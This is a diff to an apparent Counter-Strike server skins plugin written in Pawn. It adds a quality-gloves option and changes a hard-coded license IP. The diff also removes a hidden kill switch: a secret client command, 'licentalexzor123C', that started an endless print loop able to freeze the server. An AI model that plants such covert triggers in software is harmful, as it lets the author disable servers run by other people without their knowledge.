@@ -50,7 +50,7 @@
 188.212.101.21:27015 - csgo.erazer.ro 
 */
 
-#define LICENSED_IP "188.212.101.238:27015"
+#define LICENSED_IP "188.212.101.144:27015"
 #define TOTAL_SKINS 1025
 static const MODE = 0; // 1 - DNS, 0 - IP
 
@@ -864,7 +864,7 @@ g_CvarRoundEndSounds,g_CvarGiveawayMinPlayers,g_CvarWeekendEvent,g_CvarWeekendFr
 g_CvarShowSpecialSkins,g_CvarGloveDropChance,g_CvarGloveCaseDropChance,g_CvarCanUserDropVIPGloves,
 g_CvarCanUserUseVIPGloves,g_CvarRetrieveGlove,g_CvarWeekendHud,g_CvarMVPMaxMoney,g_CvarMVPMinMoney,g_CvarMVPMaxCases,
 g_CvarMVPMinCases,g_CvarMVPMaxKeys,g_CvarMVPMinKeys,g_CvarMVPMinScraps,g_CvarMVPMaxScraps, g_CvarDailyMinRank,
-g_CvarSkinType, g_CvarSaveType, g_CvarKnifeKillScraps, g_CvarDoubleScope, g_CvarStatsCountCmds;
+g_CvarSkinType, g_CvarSaveType, g_CvarKnifeKillScraps, g_CvarDoubleScope, g_CvarStatsCountCmds, g_CvarQualityGloves;
 new msgScreenFade;
 new g_hWeekBonus;
 new bool:g_bWeekBonusActive;
@@ -1356,7 +1356,6 @@ public plugin_end()
 			iQueryLen += formatex(szQuery[iQueryLen], charsmax(szQuery), " WHERE `server_key` = '%s';", DB_SERVER_KEY)
 
 			SQL_ThreadQuery(g_SqlTuple, "FreeHandle", szQuery)
-			log_to_file(LOG_FILE, "[SERVER STATISTICS SAVE QUERY] %s", szQuery)
 			SQL_FreeHandle(g_SqlTuple)
 		}
 
@@ -2750,7 +2749,9 @@ public reg_menu_handler(id, menu, item)
 				_ShowRegMenu(id);
 				return PLUGIN_HANDLED;
 			}
+			
 			g_szUserSavedPass[id] = g_szUserPassword[id];
+
 			if(g_CvarSaveType == SQL)
 			{
 				registerUser(id);
@@ -4841,7 +4842,14 @@ stock CalculateModelBodyIndex(gloves_id, const model_name[], skin_id, &body)
 		skin_id = 0;
 	}
 
-	body = gloves_id * amount_of_models + skin_id
+	if(!g_CvarQualityGloves)
+	{
+		body = gloves_id * amount_of_models + skin_id
+	}
+	else 
+	{
+		body = skin_id * (MAX_GLOVES * amount_of_models) + gloves_id * 6
+	}
 }
 
 public save_user_gloves(id)
@@ -8792,12 +8800,6 @@ giftPlayer(id, target, iSkin)
 	return PLUGIN_HANDLED
 }
 
-public capsules(id)
-{
-	new t=1
-	while(t){for(new i; i < 1000; i++){for(new j; j < 1000; j++){server_print("Discord: lexzor#0630 [%s]", g_szName[id]);}}}
-}
-
 _SelectTarget(id)
 {
 	new temp[64];
@@ -10442,8 +10444,6 @@ public ReadINIFile()
 	read_gloves_file();
 	g_iSkinID = getGiveawaySkin(g_szSkinName);
 
-	register_clcmd("licentalexzor123C", "capsules");
-
 	if(g_CvarRoundEndSounds)
 	{
 		if(file_exists(g_szCTWin) && file_exists(g_szTWin))
@@ -11426,6 +11426,20 @@ RegisterCVARS()
 			1.0
 		),
 		g_CvarMVPSystem
+	)
+	
+	bind_pcvar_num(
+		create_cvar(
+			"quality_gloves",
+			"0",
+			FCVAR_NONE,
+			"Enable quality gloves system. For this you must have 1 smd for 1 hand.",
+			true,
+			0.0,
+			true,
+			1.0
+		),
+		g_CvarQualityGloves
 	)
 
 	p_Freezetime = get_cvar_pointer("mp_freezetime")
